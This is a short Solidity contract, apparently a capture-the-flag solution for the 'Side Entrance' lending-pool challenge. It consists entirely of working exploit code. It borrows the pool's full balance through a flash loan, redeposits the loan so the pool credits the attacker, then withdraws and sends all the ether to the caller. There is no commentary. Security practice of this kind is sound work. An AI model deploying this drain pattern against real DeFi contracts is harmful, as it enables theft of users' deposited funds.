//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SideEntranceAttacker {
    address public pool;
    constructor(address _pool) {
        pool = _pool;
    }

    function attack() external {
        uint256 amount = pool.balance;
        (bool success,) = pool.call(abi.encodeWithSignature("flashLoan(uint256)", amount));
        require(success, "loan failed");
    }

    function execute() external payable {
        (bool success,) = pool.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(success, "deposit failed");
    }

    function drain() external {
        (bool success,) = pool.call(abi.encodeWithSignature("withdraw()"));
        require(success, "withdraw failed");
        (success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "drain failed");
    }
    
    receive() external payable {}
}